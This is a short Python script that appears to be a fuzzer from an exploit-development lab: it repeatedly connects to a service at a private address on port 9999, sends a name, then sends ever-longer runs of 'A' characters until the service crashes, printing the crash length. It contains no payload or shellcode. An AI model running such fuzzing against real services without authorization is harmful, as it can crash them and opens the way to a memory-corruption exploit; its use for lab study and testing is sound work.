#!/usr/bin/env python3

import socket, time, sys

ip = "172.16.0.4"

port = 9999
timeout = 5

name = "My Name"
string = "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      get = s.recv(1024)
      print(get)
      get = s.recv(1024)
      print(get)
      print("Sending name...")
      s.send(bytes(name + "\r\n", "latin-1"))
      get = s.recv(1024)
      print(get)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
      s.close()
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)